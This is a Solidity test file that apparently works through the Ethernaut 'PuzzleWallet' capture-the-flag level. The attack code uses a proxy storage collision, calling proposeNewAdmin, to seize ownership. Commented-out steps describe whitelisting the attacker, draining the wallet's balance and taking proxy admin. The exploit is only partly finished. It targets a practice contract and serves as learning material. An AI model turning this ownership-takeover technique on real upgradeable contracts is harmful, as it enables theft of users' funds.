// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

// Note: use --use solc:0.6.2 because of the UpgradeableProxy version.

import {LevelFactory} from "../utils/LevelFactory.sol";
import {PuzzleWallet, PuzzleProxy} from "../../src/PuzzleWallet/Level.sol";

interface IPuzzle {
  function owner() external view returns (address);

  function whitelisted(address) external view returns (bool);

  function multicall(bytes[] calldata data) external payable;
}

interface IPuzzleProxy  {
  function admin() external view returns (address);
}

contract PuzzleWalletTest is LevelFactory {
  IPuzzle puzzle;
  IPuzzleProxy proxy;

  PuzzleWallet puzzleWallet;

  function setUp() public {
    vm.startPrank(deployer, deployer);
    puzzle = IPuzzle(address(new PuzzleWallet()));
    bytes memory data = abi.encodeWithSignature("init(uint256)", 100 ether);
    proxy = IPuzzleProxy(address(new PuzzleProxy(deployer, address(puzzle), data)));
    vm.stopPrank();
  }

  function testAttack() public {
    submitLevel("SampleLevel");
  }

  function _performTest() internal override {
    emit log_named_uint("deployer num", uint(deployer));

    (bool status, ) = address(proxy).call(abi.encodeWithSignature("proposeNewAdmin(address)", attacker)); // storage collision !
    require(status, "didn't worked");
    assertEq(puzzleWallet.owner(), attacker);

    /*puzzleWallet.addToWhitelist(attacker);
    assert(puzzleWallet.whitelisted(attacker));*/

    // We can now make a storage collision by calling setMaxBalance() and be admin
    // But we must first drain the contract funds
    /*uint ownerBal = puzzleWallet.balances(attacker);
    emit log_named_uint("ownerBal", ownerBal);
    assert(ownerBal > 0);
    puzzleWallet.execute(attacker, ownerBal, "");
    assert(payable(address(puzzleWallet)).balance == 0);
    emit log("Yessai");*/
    // bytes[] memory data = new bytes[](1);
    // data[0] = abi.encode
    // puzzleWallet.multicall()
  }

  function _setupTest() internal override {
    super._setupTest();
    vm.deal(attacker, 5 ether);
    vm.deal(deployer, 5 ether);
    
    puzzleWallet = PuzzleWallet(address(proxy));
    puzzleWallet.addToWhitelist(deployer);
    assert(puzzleWallet.whitelisted(deployer));
    puzzleWallet.deposit.value(1 ether)();
  }

  function _checkTest() internal override returns (bool) {
    assertEq(proxy.admin(), attacker);
  
    return proxy.admin() == attacker;
  }
}
